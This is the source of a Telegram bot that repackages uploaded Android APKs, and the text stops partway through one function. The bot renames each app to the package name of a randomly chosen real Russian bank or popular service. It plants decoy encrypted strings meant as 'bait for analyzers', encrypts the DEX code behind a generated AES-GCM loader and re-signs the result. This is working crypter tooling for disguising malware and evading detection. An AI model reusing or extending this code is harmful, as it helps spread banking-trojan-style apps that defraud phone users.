# -*- coding: utf-8 -*-
import asyncio
import hashlib
import os
import random
import re
import shutil
import string
import struct
import subprocess
import tempfile
import unicodedata
from dataclasses import dataclass

from aiogram import Bot, Dispatcher, F, types
from aiogram.types import FSInputFile
from dotenv import load_dotenv

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ENV_PATH = os.path.join(BASE_DIR, ".env")
APKSIGNER_MAIN_CLASS = "com.android.apksigner.ApkSignerTool"

load_dotenv(ENV_PATH)


def get_env(name, default="", *, strip=True):
    value = os.getenv(name)
    if value is None:
        value = default
    return value.strip() if strip else value


def get_env_bool(name, default=False):
    value = os.getenv(name)
    if value is None:
        return default

    normalized = value.strip().lower()
    if normalized in {"1", "true", "yes", "on"}:
        return True
    if normalized in {"0", "false", "no", "off"}:
        return False
    return default


def get_env_apksigner_bool(name, default=""):
    value = get_env(name, default)
    normalized = value.lower()
    if not normalized:
        return ""
    if normalized in {"1", "true", "yes", "on"}:
        return "true"
    if normalized in {"0", "false", "no", "off"}:
        return "false"
    return normalized


def resolve_project_path(path_value):
    cleaned = (path_value or "").strip()
    if not cleaned:
        return ""

    expanded = os.path.expandvars(os.path.expanduser(cleaned))
    if os.path.isabs(expanded):
        return expanded

    return os.path.abspath(os.path.join(BASE_DIR, expanded))


def resolve_command_or_path(value, default=""):
    cleaned = get_env(value, default) if value.isupper() else (value or "").strip()
    if not cleaned:
        return ""

    if os.path.isabs(cleaned) or cleaned.startswith(".") or "/" in cleaned or "\\" in cleaned:
        return resolve_project_path(cleaned)

    return cleaned


def guess_keystore_type(path_value):
    suffix = os.path.splitext(path_value)[1].lower()
    if suffix in {".jks", ".keystore"}:
        return "JKS"
    if suffix in {".p12", ".pfx", ".pkcs12"}:
        return "PKCS12"
    return ""


# --- Settings ---
API_TOKEN = get_env("BOT_TOKEN", "")
SIGNER_PATH = resolve_project_path(get_env("SIGNER_PATH", "uber-apk-signer-1.3.0.jar"))
KS_PATH = resolve_project_path(get_env("KS_PATH", "my-release-key.jks"))
KS_ALIAS = get_env("KS_ALIAS", "my-alias")
KS_PASS = get_env("KS_PASS", "12345678", strip=False)
KS_KEY_PASS = get_env("KS_KEY_PASS", KS_PASS, strip=False)
KS_TYPE = get_env("KS_TYPE", guess_keystore_type(KS_PATH))
KS_PASS_ENCODING = get_env("KS_PASS_ENCODING", "")
SIGN_MIN_SDK_VERSION = get_env("SIGN_MIN_SDK_VERSION", "")
SIGN_MAX_SDK_VERSION = get_env("SIGN_MAX_SDK_VERSION", "")
SIGN_V1_ENABLED = get_env_apksigner_bool("SIGN_V1_ENABLED", "")
SIGN_V2_ENABLED = get_env_apksigner_bool("SIGN_V2_ENABLED", "true")
SIGN_V3_ENABLED = get_env_apksigner_bool("SIGN_V3_ENABLED", "true")
SIGN_V4_ENABLED = get_env_apksigner_bool("SIGN_V4_ENABLED", "")
SIGN_VERITY_ENABLED = get_env_apksigner_bool("SIGN_VERITY_ENABLED", "")
REQUIRE_SHA256_KEYSTORE = get_env_bool("REQUIRE_SHA256_KEYSTORE", True)
VERIFY_SIGNED_APK = get_env_bool("VERIFY_SIGNED_APK", True)
ZIPALIGN_PATH = resolve_command_or_path("ZIPALIGN_PATH", "zipalign")
JAVA_OPTS = get_env("JAVA_OPTS", "-Xmx256m")
REQUESTS_DIR = os.path.join(BASE_DIR, "requests")
PACKAGE_CHOICES = [
    "ru.sberbankmobile",
    "com.idamob.tinkoff.android",
    "ru.rostel",
    "ru.duplex.mobi",
    "ru.mts.mymts",
    "ru.mail.cloud",
    "com.avito.android",
    "ru.yandex.taxi",
    "com.vkontakte.android",
    "ru.ok.android",
    "ru.alfabank.mobile.android",
    "ru.vtb24.mobilebanking.android",
    "ru.megafon.mlk",
    "ru.mail.mailapp",
    "ru.ozon.app.android",
]

FAKE_STRINGS = [
    # permissions
    "android.permission.INTERNET",
    "android.permission.READ_PHONE_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.CAMERA",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.USE_BIOMETRIC",
    # firebase / analytics
    "com.google.firebase.analytics.FirebaseAnalytics",
    "com.google.android.gms.analytics.GoogleAnalytics",
    "com.appsflyer.AppsFlyerLib",
    "com.amplitude.api.Amplitude",
    # system APIs
    "android.app.NotificationManager",
    "javax.net.ssl.TrustManagerFactory",
    "android.hardware.camera2.CameraManager",
    "com.android.internal.util.Preconditions",
    "android.os.Build.VERSION.SDK_INT",
    "android.content.pm.PackageManager",
    "android.telephony.TelephonyManager",
    "android.app.ActivityManager",
    "android.content.ContentResolver",
    "android.provider.Settings.Secure",
    # intent actions
    "android.intent.action.MAIN",
    "android.intent.action.VIEW",
    "android.intent.action.BOOT_COMPLETED",
    "android.intent.category.LAUNCHER",
    # security / network
    "javax.net.ssl.SSLContext",
    "java.security.MessageDigest",
    "java.security.KeyStore",
    # HTTP headers (bait for analyzers)
    "X-Requested-With",
    "Authorization",
]

FAKE_SMALI_PACKAGES = [
    "com/analytics/core",
    "com/util/crypto",
    "com/net/ssl",
    "com/security/guard",
    "com/app/internal",
]

dp = Dispatcher()


@dataclass(frozen=True)
class BuildPaths:
    request_dir: str
    input_file: str
    work_dir: str
    unsigned_apk_path: str
    aligned_apk_path: str
    output_apk_path: str


def create_build_paths(input_name):
    safe_name = os.path.basename(input_name) or "input.apk"
    os.makedirs(REQUESTS_DIR, exist_ok=True)

    request_dir = tempfile.mkdtemp(prefix="request-", dir=REQUESTS_DIR)
    downloads_dir = os.path.join(request_dir, "downloads")
    artifacts_dir = os.path.join(request_dir, "artifacts")

    os.makedirs(downloads_dir, exist_ok=True)
    os.makedirs(artifacts_dir, exist_ok=True)

    return BuildPaths(
        request_dir=request_dir,
        input_file=os.path.join(downloads_dir, safe_name),
        work_dir=os.path.join(request_dir, "temp_work"),
        unsigned_apk_path=os.path.join(artifacts_dir, "rebuilt_game-unsigned.apk"),
        aligned_apk_path=os.path.join(artifacts_dir, "rebuilt_game-aligned.apk"),
        output_apk_path=os.path.join(artifacts_dir, "rebuilt_game.apk"),
    )

class StageError(Exception):
    def __init__(self, stage, details=""):
        self.stage = stage
        self.details = details.strip()
        super().__init__(self.details or stage)


class KeystoreConfigError(Exception):
    pass


def generate_random_string(length=10):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))


def choose_random_package():
    return random.choice(PACKAGE_CHOICES)


def normalize_cli_output(text, limit=1600):
    cleaned = (text or "").strip()
    if not cleaned:
        return ""
    if len(cleaned) <= limit:
        return cleaned
    return f"{cleaned[:limit].rstrip()}..."


def combine_process_output(stdout, stderr):
    parts = []
    for chunk in (stdout, stderr):
        chunk = (chunk or "").strip()
        if chunk:
            parts.append(chunk)
    return "\n".join(parts)


def calculate_sha256(path, chunk_size=1024 * 1024):
    digest = hashlib.sha256()
    with open(path, "rb") as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            digest.update(chunk)
    return digest.hexdigest()


def run_command(command, stage, *, env=None):
    try:
        return subprocess.run(
            command,
            check=True,
            capture_output=True,
            text=True,
            env=env,
        )
    except FileNotFoundError as exc:
        executable = ""
        if isinstance(command, (list, tuple)) and command:
            executable = str(command[0])
        elif isinstance(command, str):
            executable = command.strip().split()[0]
        else:
            executable = str(command)

        tool_name = os.path.basename(executable) or executable
        details = f"Required command '{tool_name}' was not found. Check that it is installed and available in PATH."
        raise StageError(stage, details) from exc
    except subprocess.CalledProcessError as exc:
        details = combine_process_output(exc.stdout, exc.stderr)
        raise StageError(stage, normalize_cli_output(details)) from exc


def append_option_if_value(command, option_name, option_value):
    if option_value != "":
        command.extend([option_name, option_value])


def remove_file_if_exists(path):
    if os.path.exists(path):
        os.remove(path)


def describe_secret_issues(env_name, value):
    issues = []

    if value != value.strip():
        issues.append(f"{env_name} contains leading or trailing whitespace.")

    invisible_codes = []
    for char in value:
        if char in {"\u00A0", "\u200B", "\u200C", "\u200D", "\uFEFF"}:
            invisible_codes.append(f"U+{ord(char):04X}")
            continue

        if unicodedata.category(char) == "Cf":
            invisible_codes.append(f"U+{ord(char):04X}")

    if invisible_codes:
        unique_codes = ", ".join(sorted(set(invisible_codes)))
        issues.append(f"{env_name} contains invisible characters ({unique_codes}).")

    return issues


def build_keystore_troubleshooting(*, include_key_password=True):
    hints = [
        "A JKS or PKCS12 warning by itself is not a failure: JKS is old, but still supported.",
        f"Make sure the expected keystore is being used: '{KS_PATH}'.",
    ]

    if KS_TYPE:
        hints.append(f"Signing is configured to use keystore type KS_TYPE={KS_TYPE}.")
    else:
        hints.append("If this is a JKS file on Linux or a newer Java runtime, try setting KS_TYPE=JKS.")

    if KS_PASS_ENCODING:
        hints.append(f"Signing is configured to use password encoding KS_PASS_ENCODING={KS_PASS_ENCODING}.")
    elif any(ord(char) > 127 for char in f"{KS_PASS}{KS_KEY_PASS}"):
        hints.append("If the password contains non-ASCII characters, try setting KS_PASS_ENCODING=utf-8.")

    hints.extend(describe_secret_issues("KS_PASS", KS_PASS))

    if include_key_password:
        hints.append(
            "If keytool accepts KS_PASS but signing still fails, verify whether the key itself uses a separate password in KS_KEY_PASS."
        )
        hints.extend(describe_secret_issues("KS_KEY_PASS", KS_KEY_PASS))

    return "\n".join(f"- {hint}" for hint in hints)


def format_keystore_error(summary, *, details="", include_key_password=True):
    parts = [summary, "", build_keystore_troubleshooting(include_key_password=include_key_password)]
    if details:
        parts.extend(["", f"Tool output: {details}"])
    return "\n".join(parts)


def build_apksigner_command(input_apk, output_apk):
    command = [
        "java",
        "-cp",
        SIGNER_PATH,
        APKSIGNER_MAIN_CLASS,
        "sign",
        "--ks",
        KS_PATH,
        "--ks-key-alias",
        KS_ALIAS,
        "--ks-pass",
        f"pass:{KS_PASS}",
        "--key-pass",
        f"pass:{KS_KEY_PASS}",
    ]

    append_option_if_value(command, "--min-sdk-version", SIGN_MIN_SDK_VERSION)
    append_option_if_value(command, "--max-sdk-version", SIGN_MAX_SDK_VERSION)
    append_option_if_value(command, "--v1-signing-enabled", SIGN_V1_ENABLED)
    append_option_if_value(command, "--v2-signing-enabled", SIGN_V2_ENABLED)
    append_option_if_value(command, "--v3-signing-enabled", SIGN_V3_ENABLED)
    append_option_if_value(command, "--v4-signing-enabled", SIGN_V4_ENABLED)
    append_option_if_value(command, "--verity-enabled", SIGN_VERITY_ENABLED)

    if KS_TYPE:
        command.extend(["--ks-type", KS_TYPE])

    if KS_PASS_ENCODING:
        command.extend(["--pass-encoding", KS_PASS_ENCODING])

    command.extend(["--out", output_apk, input_apk])
    return command


def build_apksigner_verify_command(apk_path):
    command = [
        "java",
        "-cp",
        SIGNER_PATH,
        APKSIGNER_MAIN_CLASS,
        "verify",
        "--verbose",
        "--print-certs",
    ]
    append_option_if_value(command, "--min-sdk-version", SIGN_MIN_SDK_VERSION)
    append_option_if_value(command, "--max-sdk-version", SIGN_MAX_SDK_VERSION)
    command.append(apk_path)
    return command


def validate_keystore():
    if not os.path.exists(KS_PATH):
        return

    keytool_path = shutil.which("keytool")
    if not keytool_path:
        return

    command = [
        keytool_path,
        "-list",
        "-v",
        "-keystore",
        KS_PATH,
        "-alias",
        KS_ALIAS,
        "-storepass",
        KS_PASS,
    ]
    if KS_TYPE:
        command.extend(["-storetype", KS_TYPE])

    try:
        result = run_command(command, "keystore-check")
    except StageError as exc:
        message = exc.details.lower()
        if "password was incorrect" in message or "keystore was tampered with" in message:
            raise KeystoreConfigError(
                format_keystore_error(
                    "keytool could not open the keystore.",
                    details=exc.details,
                    include_key_password=False,
                )
            ) from exc
        if "alias <" in message and "does not exist" in message:
            raise KeystoreConfigError(
                format_keystore_error(
                    f"Alias '{KS_ALIAS}' was not found in keystore '{KS_PATH}'.",
                    details=exc.details,
                    include_key_password=False,
                )
            ) from exc
        raise KeystoreConfigError(
            format_keystore_error("Keystore validation failed.", details=exc.details)
        ) from exc

    if REQUIRE_SHA256_KEYSTORE:
        details = combine_process_output(result.stdout, result.stderr).replace(" ", "").lower()
        if "signaturealgorithmname:sha256" not in details:
            raise KeystoreConfigError(
                "The keystore certificate must use SHA-256. Regenerate it with "
                "'keytool -genkey -sigalg SHA256withRSA ...' or disable "
                "REQUIRE_SHA256_KEYSTORE."
            )


def xor_encrypt_bytes(text, key_bytes):
    """XOR-encrypt a UTF-8 string with a multi-byte rolling key."""
    data = text.encode("utf-8")
    return [b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)]


def _smali_array_data(byte_list):
    """Format bytes for a `.array-data 1` smali block."""
    return "\n        ".join(f"0x{b:02x}" for b in byte_list)


def generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_package):
    """
    Generate a smali class with XOR-encrypted string payloads.

    decrypt_entries : list[(method_name, fake_string)] - one method per fake string
    key_bytes       : list[int] - rolling XOR key bytes
    smali_package   : str - e.g. 'com/security/guard'
    """
    class_ref = f"L{smali_package}/{class_name};"
    key_len = len(key_bytes)

    # Precompute encrypted payloads.
    enc_data = [
        (method_name, xor_encrypt_bytes(fake_string, key_bytes))
        for method_name, fake_string in decrypt_entries
    ]

    # --- fields ---
    field_lines = [".field private static final KEY:[B"]
    for idx in range(len(enc_data)):
        field_lines.append(f".field private static final ENCRYPTED_{idx}:[B")
    fields_block = "\n".join(field_lines)

    # --- <clinit> ---
    clinit = [
        ".method static constructor <clinit>()V",
        "    .registers 1",
        f"    const/16 v0, {key_len}",
        "    new-array v0, v0, [B",
        "    fill-array-data v0, :key_data",
        f"    sput-object v0, {class_ref}->KEY:[B",
    ]
    for idx, (_, enc) in enumerate(enc_data):
        clinit += [
            f"    const/16 v0, {len(enc)}",
            "    new-array v0, v0, [B",
            f"    fill-array-data v0, :enc_data_{idx}",
            f"    sput-object v0, {class_ref}->ENCRYPTED_{idx}:[B",
        ]
    clinit += [
        "    return-void",
        "",
        "    :key_data",
        "    .array-data 1",
        f"        {_smali_array_data(key_bytes)}",
        "    .end array-data",
    ]
    for idx, (_, enc) in enumerate(enc_data):
        clinit += [
            f"    :enc_data_{idx}",
            "    .array-data 1",
            f"        {_smali_array_data(enc)}",
            "    .end array-data",
        ]
    clinit.append(".end method")

    # --- decryptors (rolling XOR via KEY) ---
    decrypt_blocks = []
    for idx, (method_name, _) in enumerate(enc_data):
        m = [
            f".method public static {method_name}()[B",
            "    .registers 8",
            f"    sget-object v0, {class_ref}->ENCRYPTED_{idx}:[B",
            f"    sget-object v1, {class_ref}->KEY:[B",
            "    array-length v3, v0",
            "    array-length v4, v1",
            "    new-array v2, v3, [B",
            "    const/4 v5, 0x0",
            f"    :loop_{method_name}",
            f"    if-ge v5, v3, :end_{method_name}",
            "    aget-byte v6, v0, v5",
            "    rem-int v7, v5, v4",
            "    aget-byte v7, v1, v7",
            "    xor-int/2addr v6, v7",
            "    int-to-byte v6, v6",
            "    aput-byte v6, v2, v5",
            "    add-int/lit8 v5, v5, 0x1",
            f"    goto :loop_{method_name}",
            f"    :end_{method_name}",
            "    return-object v2",
            ".end method",
        ]
        decrypt_blocks.append("\n".join(m))

    # --- junk method (dead code, never called) ---
    junk_name = generate_random_string(6)
    r1 = random.randint(2, 15)
    r2 = random.randint(16, 127)
    r3 = random.randint(1, 7)
    r4 = random.randint(3, 97)
    junk = "\n".join([
        f".method public static {junk_name}(I)I",
        "    .registers 5",
        f"    const/16 v0, 0x{r1:02x}",
        "    mul-int/2addr p0, v0",
        f"    const/16 v1, 0x{r2:02x}",
        "    add-int/2addr p0, v1",
        f"    const/4 v2, 0x{r3:01x}",
        "    xor-int/2addr p0, v2",
        f"    const/16 v3, 0x{r4:02x}",
        "    rem-int p0, p0, v3",
        "    return p0",
        ".end method",
    ])

    return "\n".join([
        f".class public {class_ref}",
        ".super Ljava/lang/Object;",
        "",
        fields_block,
        "",
        ".method public constructor <init>()V",
        "    .registers 1",
        f"    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V",
        "    return-void",
        ".end method",
        "",
        "\n".join(clinit),
        "",
        "\n\n".join(decrypt_blocks),
        "",
        junk,
        "",
    ])


def encrypt_dex_to_asset(work_dir):
    """
    Находит все classes*.dex в work_dir, шифрует каждый через AES-256-GCM + PBKDF2
    и кладёт зашифрованный blob в assets/<имя>.dex.enc.

    Формат blob (в порядке байт):
        4 байта  — длина password (little-endian uint32)
        N байт   — пароль (ASCII символы)
        4 байта  — iterations PBKDF2 (little-endian uint32)
        32 байта — PBKDF2-SHA256 salt
        12 байт  — AES-GCM nonce (IV)
        16 байт  — GCM auth-tag
        M байт   — зашифрованный dex

    Пароль и salt генерируются случайно per-file, iterations — 10000..20000.
    Возвращает dict: dex_name -> (password_bytes, salt, iterations)
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.backends import default_backend
    except ImportError as exc:
        raise StageError(
            "dex-encrypt",
            "Библиотека 'cryptography' не установлена. "
            "Запустите: pip install cryptography",
        ) from exc

    assets_dir = os.path.join(work_dir, "assets")
    os.makedirs(assets_dir, exist_ok=True)

    dex_meta = {}

    for fname in sorted(os.listdir(work_dir)):
        if not re.fullmatch(r"classes\d*\.dex", fname):
            continue

        dex_path = os.path.join(work_dir, fname)
        with open(dex_path, "rb") as fh:
            dex_data = fh.read()

        password_bytes = os.urandom(24)           # 24 случайных байта → hex-пароль
        password_hex = password_bytes.hex().encode("ascii")
        salt = os.urandom(32)
        iterations = random.randint(10_000, 20_000)
        nonce = os.urandom(12)

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
            backend=default_backend(),
        )
        key = kdf.derive(password_hex)

        aesgcm = AESGCM(key)
        ciphertext_with_tag = aesgcm.encrypt(nonce, dex_data, None)
        # AESGCM.encrypt возвращает ciphertext + 16-байтный tag в конце
        ciphertext = ciphertext_with_tag[:-16]
        tag = ciphertext_with_tag[-16:]

        blob = (
            struct.pack("<I", len(password_hex))
            + password_hex
            + struct.pack("<I", iterations)
            + salt
            + nonce
            + tag
            + ciphertext
        )

        enc_path = os.path.join(assets_dir, fname + ".enc")
        with open(enc_path, "wb") as fh:
            fh.write(blob)

        os.remove(dex_path)
        dex_meta[fname] = (password_hex, salt, iterations)
        print(f"  🔐 {fname} → assets/{fname}.enc ({len(dex_data)} б → {len(blob)} б)")

    return dex_meta


def generate_dex_loader_smali(dex_meta):
    """
    Генерирует smali-класс com/app/internal/DexLoader.
    Содержит по одному методу на каждый зашифрованный dex:
      public static byte[] load<Name>() throws Exception
    Метод:
      1. Читает blob из raw-ресурса (assets) через AssetManager (передаётся параметром)
      2. Парсит заголовок (длина пароля, iterations, salt, nonce, tag)
      3. Прогоняет PBKDF2WithHmacSHA256 → 32-байтный ключ
      4. Расшифровывает AES/GCM/NoPadding
      5. Возвращает byte[]
    """
    lines = [
        ".class public Lcom/app/internal/DexLoader;",
        ".super Ljava/lang/Object;",
        "",
        ".method public constructor <init>()V",
        "    .registers 1",
        "    invoke-direct {p0}, Ljava/lang/Object;-><init>()V",
        "    return-void",
        ".end method",
        "",
    ]

    for dex_name, (password_hex, salt, iterations) in dex_meta.items():
        asset_name = dex_name + ".enc"
        method_name = "load" + dex_name.replace(".", "_").capitalize()
        pw_bytes = list(password_hex)
        pw_len = len(pw_bytes)
        pw_array_data = "\n        ".join(f"0x{b:02x}" for b in password_hex)
        salt_array_data = "\n        ".join(f"0x{b:02x}" for b in salt)

        m = [
            f".method public static {method_name}("
            "Landroid/content/res/AssetManager;)[B",
            "    .registers 18",
            "",
            "    # --- читаем asset ---",
            f"    const-string v0, \"{asset_name}\"",
            "    invoke-virtual {p0, v0}, "
            "Landroid/content/res/AssetManager;"
            "->open(Ljava/lang/String;)Ljava/io/InputStream;",
            "    move-result-object v0",
            "    invoke-virtual {v0}, "
            "Ljava/io/InputStream;->readAllBytes()[B",
            "    move-result-object v1",   # v1 = blob byte[]
            "    invoke-virtual {v0}, "
            "Ljava/io/InputStream;->close()V",
            "",
            "    # --- парсим заголовок: [0..3] = pw_len (LE) ---",
            "    const/4 v2, 0x0",
            "    aget-byte v3, v1, v2",
            "    int-to-byte v3, v3",       # byte → int (unsigned via & 0xFF)
            "    and-int/lit16 v3, v3, 0xFF",
            "    const/4 v4, 0x1",
            "    aget-byte v5, v1, v4",
            "    and-int/lit16 v5, v5, 0xFF",
            "    shl-int/lit8 v5, v5, 8",
            "    or-int/2addr v3, v5",
            "    const/4 v4, 0x2",
            "    aget-byte v5, v1, v4",
            "    and-int/lit16 v5, v5, 0xFF",
            "    shl-int/lit8 v5, v5, 16",
            "    or-int/2addr v3, v5",
            "    const/4 v4, 0x3",
            "    aget-byte v5, v1, v4",
            "    and-int/lit16 v5, v5, 0xFF",
            "    shl-int/lit8 v5, v5, 24",
            "    or-int/2addr v3, v5",      # v3 = pw_len
            "",
            "    # --- извлекаем password bytes ---",
            "    new-array v6, v3, [B",
            "    const/4 v7, 0x4",
            "    invoke-static {v1, v7, v6, v2, v3}, "
            "Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V",
            "",
            "    # --- извлекаем iterations (4 байта после пароля) ---",
            "    add-int v8, v7, v3",       # v8 = 4 + pw_len
            "    aget-byte v5, v1, v8",
            "    and-int/lit16 v5, v5, 0xFF",
            "    add-int/lit8 v9, v8, 0x1",
            "    aget-byte v10, v1, v9",
            "    and-int/lit16 v10, v10, 0xFF",
            "    shl-int/lit8 v10, v10, 8",
            "    or-int/2addr v5, v10",
            "    add-int/lit8 v9, v8, 0x2",
            "    aget-byte v10, v1, v9",
            "    and-int/lit16 v10, v10, 0xFF",
            "    shl-int/lit8 v10, v10, 16",
            "    or-int/2addr v5, v10",
            "    add-int/lit8 v9, v8, 0x3",
            "    aget-byte v10, v1, v9",
            "    and-int/lit16 v10, v10, 0xFF",
            "    shl-int/lit8 v10, v10, 24",
            "    or-int/2addr v5, v10",     # v5 = iterations
            "",
            "    # --- salt (32 байта) ---",
            "    const/16 v11, 0x20",
            "    new-array v12, v11, [B",
            "    add-int/lit8 v9, v8, 0x4",  # offset = 4+pw_len+4
            "    invoke-static {v1, v9, v12, v2, v11}, "
            "Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V",
            "",
            "    # --- nonce (12 байт) ---",
            "    const/16 v13, 0x0C",
            "    new-array v14, v13, [B",
            "    add-int v9, v9, v11",      # offset += 32
            "    invoke-static {v1, v9, v14, v2, v13}, "
            "Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V",
            "",
            "    # --- tag+ciphertext (остаток = blob.length - offset - 12) ---",
            "    add-int v9, v9, v13",      # offset += 12
            "    array-length v15, v1",
            "    sub-int v16, v15, v9",     # v16 = remaining length (tag+ct)
            "    new-array v15, v16, [B",
            "    invoke-static {v1, v9, v15, v2, v16}, "
            "Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V",
            "",
            "    # --- PBKDF2 ---",
            "    const-string v0, \"PBKDF2WithHmacSHA256\"",
            "    invoke-static {v0}, "
            "Ljavax/crypto/SecretKeyFactory;->getInstance("
            "Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;",
            "    move-result-object v0",
            "    const-string v17, \"AES\"",
            "    new-instance v10, "
            "Ljavax/crypto/spec/PBEKeySpec;",
            "    invoke-static {v6}, "
            "Ljava/lang/String;->valueOf([B)Ljava/lang/String;",  # pw bytes → String
            "    move-result-object v11",
            "    invoke-virtual {v11}, "
            "Ljava/lang/String;->toCharArray()[C",
            "    move-result-object v11",  # v11 = char[]
            "    const/16 v13, 256",
            "    invoke-direct {v10, v11, v12, v5, v13}, "
            "Ljavax/crypto/spec/PBEKeySpec;-><init>([C[BII)V",
            "    invoke-virtual {v0, v10}, "
            "Ljavax/crypto/SecretKeyFactory;->generateSecret("
            "Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;",
            "    move-result-object v0",
            "    invoke-virtual {v0}, "
            "Ljavax/crypto/SecretKey;->getEncoded()[B",
            "    move-result-object v0",  # v0 = raw key bytes
            "",
            "    # --- AES/GCM/NoPadding ---",
            "    new-instance v11, "
            "Ljavax/crypto/spec/SecretKeySpec;",
            "    invoke-direct {v11, v0, v17}, "
            "Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V",
            "    new-instance v12, "
            "Ljavax/crypto/spec/GCMParameterSpec;",
            "    const/16 v13, 128",       # tag size bits
            "    invoke-direct {v12, v13, v14}, "
            "Ljavax/crypto/spec/GCMParameterSpec;-><init>(I[B)V",
            "    const-string v0, \"AES/GCM/NoPadding\"",
            "    invoke-static {v0}, "
            "Ljavax/crypto/Cipher;->getInstance("
            "Ljava/lang/String;)Ljavax/crypto/Cipher;",
            "    move-result-object v0",
            "    sget v13, "
            "Ljavax/crypto/Cipher;->DECRYPT_MODE:I",
            "    invoke-virtual {v0, v13, v11, v12}, "
            "Ljavax/crypto/Cipher;->init("
            "ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V",
            "    invoke-virtual {v0, v15}, "
            "Ljavax/crypto/Cipher;->doFinal([B)[B",
            "    move-result-object v0",
            "    return-object v0",
            ".end method",
            "",
        ]
        lines.extend(m)

    return "\n".join(lines)


def inject_security_measures(work_dir):
    print("Applying code hardening...")

    manifest = os.path.join(work_dir, "AndroidManifest.xml")
    if os.path.exists(manifest):
        with open(manifest, "r", encoding="utf-8") as file:
            data = file.read()

        data = re.sub(r'android:debuggable="(true|false)"', "", data)
        data = re.sub(r'android:allowBackup="(true|false)"', "", data)
        data = data.replace(
            "<application",
            '<application android:debuggable="false" android:allowBackup="false"',
        )

        with open(manifest, "w", encoding="utf-8") as file:
            file.write(data)

    for _ in range(10):
        smali_package = random.choice(FAKE_SMALI_PACKAGES)
        package_path = os.path.join(work_dir, "smali", *smali_package.split("/"))
        os.makedirs(package_path, exist_ok=True)

        class_name = generate_random_string(8)
        key_len = random.randint(4, 8)
        key_bytes = [random.randint(1, 255) for _ in range(key_len)]
        decrypt_entries = [
            (generate_random_string(6), random.choice(FAKE_STRINGS)),
            (generate_random_string(6), random.choice(FAKE_STRINGS)),
        ]

        smali_content = generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_package)
        smali_file = os.path.join(package_path, f"{class_name}.smali")
        with open(smali_file, "w", encoding="utf-8") as file:
            file.write(smali_content)


def sign_apk(unsigned_apk, aligned_apk, output_apk, *, env=None):
    remove_file_if_exists(aligned_apk)
    remove_file_if_exists(output_apk)

    run_command(
        [ZIPALIGN_PATH, "-f", "-p", "4", unsigned_apk, aligned_apk],
        "zipalign",
        env=env,
    )

    try:
        run_command(build_apksigner_command(aligned_apk, output_apk), "sign", env=env)
    except StageError as exc:
        message = exc.details.lower()
        if "keystore was tampered with" in message or "password was incorrect" in message:
            raise KeystoreConfigError(
                format_keystore_error(
                    "The signing tool could not open the keystore.",
                    details=exc.details,
                )
            ) from exc
        if "does not exist" in message and "alias" in message:
            raise KeystoreConfigError(
                format_keystore_error(
                    f"Alias '{KS_ALIAS}' was not found in keystore '{KS_PATH}'.",
                    details=exc.details,
                )
            ) from exc
        if "cannot recover key" in message or "failed to obtain key" in message:
            raise KeystoreConfigError(
                format_keystore_error(
                    "The keystore opened, but the key password was rejected. Check KS_KEY_PASS.",
                    details=exc.details,
                )
            ) from exc
        raise

    if VERIFY_SIGNED_APK:
        run_command(build_apksigner_verify_command(output_apk), "verify", env=env)


def patch_apk(paths, new_package):
    work_dir = paths.work_dir
    java_env = {**os.environ, "JAVA_OPTS": JAVA_OPTS}

    if os.path.exists(work_dir):
        shutil.rmtree(work_dir)

    for artifact in (paths.unsigned_apk_path, paths.aligned_apk_path, paths.output_apk_path):
        remove_file_if_exists(artifact)

    print("Unpacking APK (large files may take a while)...")
    run_command(
        ["apktool", "d", paths.input_file, "-o", work_dir, "-f"],
        "decode",
        env=java_env,
    )

    manifest = os.path.join(work_dir, "AndroidManifest.xml")
    with open(manifest, "r", encoding="utf-8") as file:
        data = file.read()

    data = re.sub(r'package="[^"]+"', f'package="{new_package}"', data)

    with open(manifest, "w", encoding="utf-8") as file:
        file.write(data)

    inject_security_measures(work_dir)

    print("🔐 Шифрование DEX → assets (AES-256-GCM + PBKDF2)...")
    dex_meta = encrypt_dex_to_asset(work_dir)
    if dex_meta:
        loader_smali = generate_dex_loader_smali(dex_meta)
        loader_dir = os.path.join(work_dir, "smali", "com", "app", "internal")
        os.makedirs(loader_dir, exist_ok=True)
        with open(os.path.join(loader_dir, "DexLoader.smali"), "w", encoding="utf-8") as fh:
            fh.write(loader_smali)

    print("Rebuilding APK...")
    run_command(
        ["apktool", "b", work_dir, "-o", paths.unsigned_apk_path],
        "build",
        env=java_env,
    )

    print("Running zipalign...")
    print("Signing APK (V2/V3)...")
    sign_apk(paths.unsigned_apk_path, paths.aligned_apk_path, paths.output_apk_path, env=java_env)

    return paths.output_apk_path


def build_stage_message(error):
    if error.stage == "decode":
        return (
            "APK decode failed.\n\n"
            f"{error.details or 'Check that the input APK is valid and can be processed by apktool.'}"
        )
    if error.stage == "build":
        return (
            "APK rebuild failed.\n\n"
            f"{error.details or 'Check smali and manifest changes after patching.'}"
        )
    if error.stage == "zipalign":
        return (
            "zipalign failed.\n\n"
            f"{error.details or 'Check that zipalign is installed and available in PATH.'}"
        )
    if error.stage == "sign":
        return (
            "APK signing failed.\n\n"
            f"{error.details or 'Check keystore configuration and signing options.'}"
        )
    if error.stage == "verify":
        return (
            "APK verification failed.\n\n"
